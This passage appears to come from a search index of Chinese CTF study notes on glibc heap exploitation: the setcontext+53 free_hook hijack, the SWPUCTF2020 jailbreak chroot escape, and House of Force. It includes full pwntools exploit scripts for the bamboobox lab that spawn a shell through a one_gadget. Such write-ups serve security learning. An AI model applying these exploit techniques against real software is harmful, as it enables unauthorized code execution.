\u7a0b\u5e8f\u9650\u5236\u64cd\u4f5c\u6b21\u6570\uff0c\u4ee5\u53ca\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u5141\u8bb8\u5206\u914d\u7684\u5806 size \u603b\u6570\uff0c\u8fd9\u4e2a\u6570\u5b58\u653e\u5728\u5806\u4e0a\uff1a \u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u8c03\u7528 chroot \u6539\u53d8\u6839\u76ee\u5f55\uff1a \u6f0f\u6d1e \u00b6 \u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\u5b58\u5728 off by one \uff1a \u601d\u8def \u00b6 libc \u5730\u5740\u600e\u4e48\u90fd\u662f\u8981\u77e5\u9053\u7684\uff0c\u9898\u76ee\u9650\u5236\u7533\u8bf7\u603b size \uff0c\u5148\u7528 offbyone \u6cc4\u9732\u5806\u5730\u5740\u540e\uff0c\u518d\u4fee\u6539 tcachebin \u5c06\u5806\u5206\u914d\u5230\u5b58\u50a8 size \u7684\u7a7a\u95f4\u4e0a\uff0c\u8c03\u5927 size \u3002\u4f2a\u9020 size \u4f4d\u5c06 unsortedbin \u5305\u542b\u5230\u4e00\u4e2a\u80fd\u6b63\u5e38\u8bfb\u53d6\u7684\u5806\u4e2d\uff0c\u6cc4\u9732 libc \u5730\u5740\u3002\u52ab\u6301 __free_hook \u4e3a setcontext+53 \uff0c\u5229\u7528\u63d0\u524d\u5e03\u7f6e\u597d\u7684 ucontext \u6539\u53d8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u52ab\u6301\u6d41\u7a0b\u8fd0\u884c\u63d0\u524d\u5e03\u7f6e\u7684 payload \u3002\u8fd0\u884c chroot(fd) \u5b8c\u6210\u9003\u9038\u540e system('/bin/sh') \u53c2\u8003\u6587\u7ae0 \u00b6 setcontext \u51fd\u6570exploit DASCTF 7\u6708\u90e8\u5206pwn \u9ad8\u6821\u6218\u201c\u75ab\u201d\u7f51\u7edc\u5b89\u5168\u5206\u4eab\u8d5bpwn\u90e8\u5206wp","title":"\u6c99\u76d2\u5806\u6ea2\u51fa"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_1","text":"\u5728\u590d\u73b0 SWPUCTF2020 jailbreak \u9047\u5230\u6253\u5f00\u6c99\u76d2\u5806\u6ea2\u51fa\u9898\u76ee\uff0c\u8fd9\u6761\u9898\u76ee\u5b9e\u9645\u4e0a\u8fd8\u6709 chroot \u9003\u9038\uff0c\u8fd9\u4e2a\u5148\u653e\u540e\u9762\u3002\u6c99\u76d2\u5806\u6ea2\u51fa\u5229\u7528\u65b9\u6cd5\u6838\u5fc3\u662f setcontext() \uff0c\u4ee5\u8fd9\u4e2a\u70b9\u641c\u5bfb\u5176\u4ed6\u540c\u7c7b\u9898\u76ee\u3002\u5e74\u524d\u7684\u9ad8\u6821\u6218\u5f79 lgd \uff0c\u4e03\u6708\u4efd DASCTF bigbear \u3002","title":"\u6c99\u76d2\u5806\u6ea2\u51fa\u5b66\u4e60"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#setcontext","text":"// stdlib/setcontext.c #include <errno.h> #include <ucontext.h> int setcontext ( const ucontext_t * ucp ){ \u2026\u2026 }; \u5176\u4f5c\u7528\u662f\u7528\u6237\u4e0a\u4e0b\u6587\u7684\u8bbe\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u53ef\u4ee5\u5c0f\u8303\u56f4\u63a7\u5236\u6267\u884c\u6d41\uff0c\u5df2\u77e5 libc_base \u4f46\u4e0d\u8db3\u4ee5\u5b8c\u6210\u6211\u4eec\u7684\u76ee\u6807\u65f6\uff0c\u53ef\u4ee5\u5148\u8df3 setcontext+53 \u6765\u6269\u5927\u63a7\u5236\u8303\u56f4\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f**\u901a\u8fc7 setcontext \u63a7\u5236\u5bc4\u5b58\u5668\u7684\u503c**\uff0c\u6709\u70b9 srop \u7684\u601d\u60f3\u3002","title":"setcontext"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#setcontext53-crash","text":"libc 2.27 \u4e0b\u5b8c\u6574 setcontext \u5982\u4e0b\uff1a <setcontext>: push rdi <setcontext+1>: lea rsi, [ rdi+0x128 ] <setcontext+8>: xor edx,edx <setcontext+10>: mov edi,0x2 <setcontext+15>: mov r10d,0x8 <setcontext+21>: mov eax,0xe <setcontext+26>: syscall <setcontext+28>: pop rdi <setcontext+29>: cmp rax,0xfffffffffffff001 <setcontext+35>: jae 0x7ffff7a7d520 <setcontext+128> <setcontext+37>: mov rcx,QWORD PTR [ rdi+0xe0 ] <setcontext+44>: fldenv [ rcx ] <setcontext+46>: ldmxcsr DWORD PTR [ rdi+0x1c0 ] <setcontext+53>: mov rsp,QWORD PTR [ rdi+0xa0 ] <setcontext+60>: mov rbx,QWORD PTR [ rdi+0x80 ] <setcontext+67>: mov rbp,QWORD PTR [ rdi+0x78 ] <setcontext+71>: mov r12,QWORD PTR [ rdi+0x48 ] <setcontext+75>: mov r13,QWORD PTR [ rdi+0x50 ] <setcontext+79>: mov r14,QWORD PTR [ rdi+0x58 ] <setcontext+83>: mov r15,QWORD PTR [ rdi+0x60 ] <setcontext+87>: mov rcx,QWORD PTR [ rdi+0xa8 ] <setcontext+94>: push rcx <setcontext+95>: mov rsi,QWORD PTR [ rdi+0x70 ] <setcontext+99>: mov rdx,QWORD PTR [ rdi+0x88 ] <setcontext+106>: mov rcx,QWORD PTR [ rdi+0x98 ] <setcontext+113>: mov r8,QWORD PTR [ rdi+0x28 ] <setcontext+117>: mov r9,QWORD PTR [ rdi+0x30 ] <setcontext+121>: mov rdi,QWORD PTR [ rdi+0x68 ] <setcontext+125>: xor eax,eax <setcontext+127>: ret <setcontext+128>: mov rcx,QWORD PTR [ rip+0x356951 ] # 0x7ffff7dd3e78 <setcontext+135>: neg eax <setcontext+137>: mov DWORD PTR fs: [ rcx ] ,eax <setcontext+140>: or rax,0xffffffffffffffff <setcontext+144>: ret fldenv [rcx] \u6307\u4ee4\u4f1a\u9020\u6210\u7a0b\u5e8f\u6267\u884c\u7684\u65f6\u5019\u76f4\u63a5crash\uff0c\u6240\u4ee5\u8981\u907f\u5f00\u8fd9\u4e2a\u6307\u4ee4\uff0c\u8df3\u8f6c\u5230 setcontext+53 \u3002","title":"setcontext+53 \u907f\u514d crash"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_2","text":"\u6c99\u76d2\u5806\u6ea2\u51fa\u9898\u76ee\u5229\u7528\u662f\u5c06 __free_hook \u52ab\u6301\u4e3a setcontext+53 \uff0c\u5f53 free \u5806\u5757\u65f6\u5806\u5730\u5740\u4f5c\u4e3a\u53c2\u6570\u653e\u5728 rdi \u4f20\u5165\u51fd\u6570\u4e2d\uff0c\u8fdb\u5165\u5230 setcontext \u5c31\u4f1a\u4ee5**\u5806\u5730\u5740**\u4f5c\u4e3a\u57fa\u5740\uff0c\u5c06\u4e0d\u540c\u504f\u79fb\u5730\u5740\u4e0a\u7684\u6570\u636e\u653e\u5165\u5bc4\u5b58\u5668\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u63a7\u5236**\u5806\u5730\u5740**\u540e\u9762\u7a7a\u95f4\u4e0a\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u63d0\u524d\u5e03\u7f6e\u7684\u6570\u636e\u5e76\u4e0d\u662f srop \u4e2d\u7684 frame\uff01\uff01\uff01\u5728\u5176\u4ed6\u9898\u76ee\u7684 wp \u4e2d\u4f7f\u7528 SigreturnFrame() \u662f\u65b9\u4fbf\u751f\u6210\u800c\u5df2\uff0c\u5e76\u4e0d\u662f\u8bf4\u660e\u586b\u8fdb\u53bb\u7684\u662f frame\u3002\u6bd4\u5982\uff1a frame.rdi=0x123456 \u6700\u540e 0x123456 \u662f\u8d4b\u503c\u5230 rsi <- mov rsi,QWORD PTR [rdi+0x70] \u6784\u9020 rsp \u65f6\u9700\u8981\u6ce8\u610f push rcx \u7684\u5f71\u54cd\uff0c\u5982\u679c rsp \u5730\u5740\u4e0d\u53ef\u8bbf\u95ee\uff0c\u7a0b\u5e8f\u5c31\u4f1a crash \u3002","title":"\u90e8\u7f72\u5806\u6808\u7a7a\u95f4\u63a7\u5236\u5bf9\u5e94\u5bc4\u5b58\u5668"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#libc-229","text":"libc 2.27 \u4e0b setcontext\uff1a <setcontext+53>: mov rsp,QWORD PTR [ rdi+0xa0 ] <setcontext+60>: mov rbx,QWORD PTR [ rdi+0x80 ] <setcontext+67>: mov rbp,QWORD PTR [ rdi+0x78 ] <setcontext+71>: mov r12,QWORD PTR [ rdi+0x48 ] <setcontext+75>: mov r13,QWORD PTR [ rdi+0x50 ] <setcontext+79>: mov r14,QWORD PTR [ rdi+0x58 ] <setcontext+83>: mov r15,QWORD PTR [ rdi+0x60 ] <setcontext+87>: mov rcx,QWORD PTR [ rdi+0xa8 ] <setcontext+94>: push rcx <setcontext+95>: mov rsi,QWORD PTR [ rdi+0x70 ] <setcontext+99>: mov rdx,QWORD PTR [ rdi+0x88 ] <setcontext+106>: mov rcx,QWORD PTR [ rdi+0x98 ] <setcontext+113>: mov r8,QWORD PTR [ rdi+0x28 ] <setcontext+117>: mov r9,QWORD PTR [ rdi+0x30 ] <setcontext+121>: mov rdi,QWORD PTR [ rdi+0x68 ] <setcontext+125>: xor eax,eax <setcontext+127>: ret <setcontext+128>: mov rcx,QWORD PTR [ rip+0x398c61 ] <setcontext+135>: neg eax <setcontext+137>: mov DWORD PTR fs: [ rcx ] ,eax <setcontext+140>: or rax,0xffffffffffffffff <setcontext+144>: ret libc 2.30 \u4e0b setcontext\uff1a <setcontext+52>: fldenv [ rcx ] <setcontext+54>: ldmxcsr DWORD PTR [ rdx+0x1c0 ] <setcontext+61>: mov rsp,QWORD PTR [ rdx+0xa0 ] <setcontext+68>: mov rbx,QWORD PTR [ rdx+0x80 ] <setcontext+75>: mov rbp,QWORD PTR [ rdx+0x78 ] <setcontext+79>: mov r12,QWORD PTR [ rdx+0x48 ] <setcontext+83>: mov r13,QWORD PTR [ rdx+0x50 ] <setcontext+87>: mov r14,QWORD PTR [ rdx+0x58 ] <setcontext+91>: mov r15,QWORD PTR [ rdx+0x60 ] <setcontext+95>: test DWORD PTR fs:0x48,0x2 <setcontext+107>: je 0x7f4ea94d71c6 <setcontext+294> <setcontext+113>: mov rsi,QWORD PTR [ rdx+0x3a8 ] <setcontext+120>: mov rdi,rsi <setcontext+123>: mov rcx,QWORD PTR [ rdx+0x3b0 ] <setcontext+130>: cmp rcx,QWORD PTR fs:0x78 <setcontext+139>: je 0x7f4ea94d7165 <setcontext+197> <setcontext+141>: mov rax,QWORD PTR [ rsi-0x8 ] <setcontext+145>: and rax,0xfffffffffffffff8 <setcontext+149>: cmp rax,rsi <setcontext+152>: je 0x7f4ea94d7140 <setcontext+160> \u539f\u6765\u662f\u4ee5 rdi \u4f5c\u4e3a\u57fa\u5730\u5740\uff0c\u5728 libc 2.29 \u4e4b\u540e\u4ee5 rdx \u4f5c\u4e3a\u57fa\u5730\u5740\u3002","title":"libc 2.29 \u4e4b\u540e\u53d8\u5316"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#swpuctf2020-jailbreak","text":"","title":"SWPUCTF2020 jailbreak"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_3","text":"[*] '/ctf/work/jailbreak' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u7a0b\u5e8f\u9650\u5236\u64cd\u4f5c\u6b21\u6570\uff0c\u4ee5\u53ca\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u5141\u8bb8\u5206\u914d\u7684\u5806 size \u603b\u6570\uff0c\u8fd9\u4e2a\u6570\u5b58\u653e\u5728\u5806\u4e0a\uff1a \u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u8c03\u7528 chroot \u6539\u53d8\u6839\u76ee\u5f55\uff1a","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_4","text":"\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\u5b58\u5728 off by one \uff1a","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_5","text":"libc \u5730\u5740\u600e\u4e48\u90fd\u662f\u8981\u77e5\u9053\u7684\uff0c\u9898\u76ee\u9650\u5236\u7533\u8bf7\u603b size \uff0c\u5148\u7528 offbyone \u6cc4\u9732\u5806\u5730\u5740\u540e\uff0c\u518d\u4fee\u6539 tcachebin \u5c06\u5806\u5206\u914d\u5230\u5b58\u50a8 size \u7684\u7a7a\u95f4\u4e0a\uff0c\u8c03\u5927 size \u3002\u4f2a\u9020 size \u4f4d\u5c06 unsortedbin \u5305\u542b\u5230\u4e00\u4e2a\u80fd\u6b63\u5e38\u8bfb\u53d6\u7684\u5806\u4e2d\uff0c\u6cc4\u9732 libc \u5730\u5740\u3002\u52ab\u6301 __free_hook \u4e3a setcontext+53 \uff0c\u5229\u7528\u63d0\u524d\u5e03\u7f6e\u597d\u7684 ucontext \u6539\u53d8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u52ab\u6301\u6d41\u7a0b\u8fd0\u884c\u63d0\u524d\u5e03\u7f6e\u7684 payload \u3002\u8fd0\u884c chroot(fd) \u5b8c\u6210\u9003\u9038\u540e system('/bin/sh')","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/#_6","text":"setcontext \u51fd\u6570exploit DASCTF 7\u6708\u90e8\u5206pwn \u9ad8\u6821\u6218\u201c\u75ab\u201d\u7f51\u7edc\u5b89\u5168\u5206\u4eab\u8d5bpwn\u90e8\u5206wp","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/","text":"House Of Force \u00b6 topchunk \u5206\u914d\u673a\u5236 \u00b6 \u4f5c\u4e3a\u524d\u7f6e\u77e5\u8bc6\uff0c\u56de\u987e\u4e00\u4e0b \u5f53\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u5f53\u524d\u6240\u6709\u7a7a\u95f2\uff08bin\u4e2d\uff09\u7684\u5806\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u6761\u4ef6\uff0c\u4e14 topchunk \u5927\u5c0f\u53ef\u4ee5\u6ee1\u8db3\u9700\u8981\u7a7a\u95f4\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece topchunk \u4e2d\u5206\u5272\u5bf9\u5e94\u7684\u5927\u5c0f\u7528\u4f5c\u5806\u5757\u7a7a\u95f4\u3002 topchunk \u5927\u5c0f\u662f\u5426\u6ee1\u8db3\u7684\u8ba1\u7b97\u6e90\u7801\uff1a // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } \u7b80\u5316\u4e00\u4e0b\u5c31\u662f\u6ee1\u8db3 MINSIZE+\u7533\u8bf7\u5927\u5c0f<=topchunk size \u5373\u53ef\u901a\u8fc7\u68c0\u67e5\uff0c\u4ece topchunk \u4e0a\u5206\u914d\u7a7a\u95f4\u7528\u4f5c\u65b0\u5806\u5757\u3002 topchunk \u4e5f\u4f1a\u5411\u9ad8\u5730\u5740\u79fb\u52a8\uff0c\u5047\u8bbe\u4ece topchunk \u5206\u914d 0x60 \u6216 0x68 \u7a7a\u95f4\uff1a \u539ftopchunk \u73b0topchunk malloc(n) topchunk\u79fb\u52a8 0x603020 0x603090 0x60 0x70 0x603020 0x603090 0x68 0x70 \u539f\u7406 \u00b6 house of force \u4ea7\u751f\u539f\u56e0\u81ea\u5b89\u4e8e glibc \u5bf9\u4e8e topchunk \u7684\u5904\u7406\u3002\u6309\u7167\u4e0a\u6587\u6240\u8bf4\u7684\uff0c\u5f53\u6ee1\u8db3 MINSIZE+\u7533\u8bf7\u5927\u5c0f<=topchunk size \u5373\u53ef\u901a\u8fc7\u68c0\u67e5\uff0c\u53ef\u4ee5\u5c06 topchunk \u7a7a\u95f4\u5212\u5206\u7ed9\u5806\u5757\uff0c\u5e76\u4e14 topchunk \u79fb\u52a8\u76f8\u5e94\u8ddd\u79bb\u3002 \u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u7533\u8bf7\u7279\u5b9a\u5927\u5c0f chunk \uff0c\u5c06 topchunk \u79fb\u52a8\u5230\u76ee\u6807\u5730\u5740\uff0c\u518d\u6b21\u7533\u8bf7\u5806\u5c31\u4f1a\u5206\u914d\u5230\u76ee\u6807\u5730\u5740\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u64cd\u4f5c\u3002\u5b9e\u73b0\u7684\u5173\u952e\u5c31\u662f\u7ed5\u8fc7 topchunk size \u68c0\u67e5\uff0c\u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5c06 size \u8986\u76d6\u4e3a -1\uff080xffffffffffffffff\uff09\uff0c\u8ba9 size \u53d8\u6210\u6700\u5927\uff08malloc \u4f1a\u5f3a\u5236\u8f6c\u6362\u4e3a unsigned int\uff09\uff0c\u4e00\u822c\u60c5\u51b5\u90fd\u80fd\u6ee1\u8db3 size check \u8981\u6c42\u3002 topchunk \u53ef\u4ee5\u6709\u4e24\u4e2a\u79fb\u52a8\u65b9\u5411\uff1a malloc(\u8d1f\u6570)\uff0c\u5c06 topchunk \u5f80\u4f4e\u5730\u5740\u79fb malloc(\u6b63\u6570)\uff0c\u5c06 topchunk \u5f80\u9ad8\u5730\u5740\u79fb \u4f7f\u7528\u6761\u4ef6 \u00b6 \u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f \u5b9e\u73b0\u6548\u679c\uff1a\u4efb\u610f\u5730\u5740\u8bfb\u5199 \u8ba1\u7b97\u504f\u79fb \u00b6 \u73b0\u5728\u5730\u5740\uff1atopchunk \u73b0\u5728\u6307\u5411\u7684\u5730\u5740 \u76ee\u6807\u5730\u5740\uff1a\u5f80\u54ea\u91cc\u5199\u5165\u7684\u5730\u5740 \u5f80\u4f4e\u5730\u5740\u79fb\uff08\u8d1f\u6570\uff09\uff1a \u504f\u79fb=\u73b0\u5728\u5730\u5740-\u76ee\u6807\u5730\u5740-0x20 \u5f80\u9ad8\u5730\u5740\u79fb\uff08\u6b63\u6570\uff09\uff1a \u504f\u79fb=\u76ee\u6807\u5730\u5740-\u73b0\u5728\u5730\u5740 \u4f8b\u9898 \u00b6 HITCON training lab 11 \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 \u7528 chunk_ptr \u548c chunk_size \u4e24\u4e2a\u5217\u8868\u7ef4\u62a4\uff0c\u57fa\u4e8e\u4e0b\u6807\u64cd\u4f5c\u5806\u5757\u3002\u589e\u5220\u67e5\u6539\u529f\u80fd\u90fd\u6709\u3002 \u6f0f\u6d1e \u00b6 \u4fee\u6539\u51fd\u6570\u8981\u6c42\u8f93\u5165\u4fee\u6539\u957f\u5ea6\uff0c\u5bf9\u8be5\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff1a printf ( \"Please enter the length of item name:\" , & buf ); read ( 0 , & v4 , 8uLL ); length = atoi ( & v4 ); printf ( \"Please enter the new name of the item:\" , & v4 ); //\u76f4\u63a5\u5199\u5165\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 * ( _BYTE * )( chunk_ptr_list [ 2 * v2 ] + ( signed int ) read ( 0 , ( void * ) chunk_ptr_list [ 2 * v2 ], length )) = 0 ; \u601d\u8def \u00b6 fastbin \u653b\u51fb malloc_hook \u65b9\u6cd5\u548c\u6b63\u5e38\u5957\u8def\u6d41\u7a0b\u5dee\u4e0d\u591a\uff0c\u6700\u540e\u8d34 exp \u3002 house of force \u4f7f\u7528\u6761\u4ef6\u90fd\u6ee1\u8db3\uff0c\u5148\u660e\u786e\u5c06 topchunk \u5411\u4e0a\u8c03\u591a\u5c11\u3002\u7533\u8bf7\u597d\u7b49\u7b49\u7528\u6765\u6ea2\u51fa\u4fee\u6539 topchunk size \u7684 chunk \u4e4b\u540e\uff0cgdb \u8c03\u8bd5\u3002 \u8fd9\u91cc\u5c31\u76f4\u63a5\u5c06\u5806\u7533\u8bf7\u8986\u76d6\u6574\u4e2a\u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u8ddd\u79bb\u8ba1\u7b97\uff1a #(0x603010-0x603090)-0x20=-0xa0 add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) \u540e\u9762\u5c31\u7533\u8bf7\u4e00\u4e2a\u5806\uff0c\u5199\u5165\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u4efb\u610f\u5730\u5740\u5199\u3002 EXP \u00b6 house of force from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./bamboobox\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) elf = ELF ( \"./bamboobox\" ) # p = remote(\"node3.buuoj.cn\",29945) # libc = ELF(\"./libc-2.23.so\") def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x68 , 'a' ) payload = 'a' * 0x68 + p64 ( 0xffffffffffffffff ) edit ( 0 , len ( payload ), payload ) add ( - 0xa0 , 'b' ) add ( 0x10 , 'skye' * 2 + p64 ( elf . sym [ 'magic' ])) p . recvuntil ( ':' ) p . sendline ( '5' ) # gdb.attach(p) p . interactive () fastbin attack from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./bamboobox\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") elf = ELF ( \"./bamboobox\" ) p = remote ( \"node3.buuoj.cn\" , 29945 ) libc = ELF ( \"./libc-2.23.so\" ) def add ( size , content ): p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def show (): p . recvuntil ( ':' ) p . sendline ( '1' ) def edit ( id , size , content ): p . recvuntil ( ':' ) p . sendline ( '3' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) p . recvuntil ( ':' ) p . sendline ( str ( size )) p . recvuntil ( ':' ) p . send ( content ) def remove ( id ): p . recvuntil ( ':' ) p . sendline ( '4' ) p . recvuntil ( ':' ) p . sendline ( str ( id )) add ( 0x100 , 'top' ) add ( 0x68 , 'overloping' ) #1 add ( 0x400 - 0x10 , 'end' ) add ( 0x68 , '/bin/sh \\x00 protect' ) #3 remove ( 0 ) payload = 'a' * 0x60 + p64 ( 0X180 ) #+'\\x00' edit ( 1 , len ( payload ), payload ) remove ( 2 ) add ( 0x100 , 'top' ) show () p . recvuntil ( \"1 : \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( \"malloc_hook:\" + hex ( malloc_hook )) realloc = libc_base + libc . sym [ 'realloc' ] add ( 0x68 , 'skye' ) #2 remove ( 2 ) edit ( 1 , len ( p64 ( malloc_hook - 27 - 8 )), p64 ( malloc_hook - 27 - 8 )) add ( 0x68 , 'skye' ) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' onegadget = libc_base + 0x4526a #0x4527a add ( 0x68 , 'a' * 11 + p64 ( onegadget ) + p64 ( realloc )) # gdb.attach(p) p . recvuntil ( ':' ) p . sendline ( '2' ) p . recvuntil ( 'name:' ) p . sendline ( str ( 0x68 )) p . interactive ()","title":"House_Of_Force"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#house-of-force","text":"","title":"House Of Force"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#topchunk","text":"\u4f5c\u4e3a\u524d\u7f6e\u77e5\u8bc6\uff0c\u56de\u987e\u4e00\u4e0b \u5f53\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u5f53\u524d\u6240\u6709\u7a7a\u95f2\uff08bin\u4e2d\uff09\u7684\u5806\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u6761\u4ef6\uff0c\u4e14 topchunk \u5927\u5c0f\u53ef\u4ee5\u6ee1\u8db3\u9700\u8981\u7a7a\u95f4\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece topchunk \u4e2d\u5206\u5272\u5bf9\u5e94\u7684\u5927\u5c0f\u7528\u4f5c\u5806\u5757\u7a7a\u95f4\u3002 topchunk \u5927\u5c0f\u662f\u5426\u6ee1\u8db3\u7684\u8ba1\u7b97\u6e90\u7801\uff1a // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } \u7b80\u5316\u4e00\u4e0b\u5c31\u662f\u6ee1\u8db3 MINSIZE+\u7533\u8bf7\u5927\u5c0f<=topchunk size \u5373\u53ef\u901a\u8fc7\u68c0\u67e5\uff0c\u4ece topchunk \u4e0a\u5206\u914d\u7a7a\u95f4\u7528\u4f5c\u65b0\u5806\u5757\u3002 topchunk \u4e5f\u4f1a\u5411\u9ad8\u5730\u5740\u79fb\u52a8\uff0c\u5047\u8bbe\u4ece topchunk \u5206\u914d 0x60 \u6216 0x68 \u7a7a\u95f4\uff1a \u539ftopchunk \u73b0topchunk malloc(n) topchunk\u79fb\u52a8 0x603020 0x603090 0x60 0x70 0x603020 0x603090 0x68 0x70","title":"topchunk \u5206\u914d\u673a\u5236"},{"location":"Pwn/glibc-heap/House/House_Of_Force/House_Of_Force/#_1","text":"house of force \u4ea7\u751f\u539f\u56e0\u81ea\u5b89\u4e8e glibc \u5bf9\u4e8e topchunk \u7684\u5904\u7406\u3002\u6309\u7167\u4e0a\u6587\u6240\u8bf4\u7684\uff0c\u5f53\u6ee1\u8db3 MINSIZE+\u7533\u8bf7\u5927\u5c0f<=topchunk size \u5373\u53ef\u901a\u8fc7\u68c0\u67e5\uff0c\u53ef\u4ee5\u5c06 topchunk \u7a7a\u95f4\u5212\u5206\u7ed9\u5806\u5757\uff0c\u5e76\u4e14 topchunk 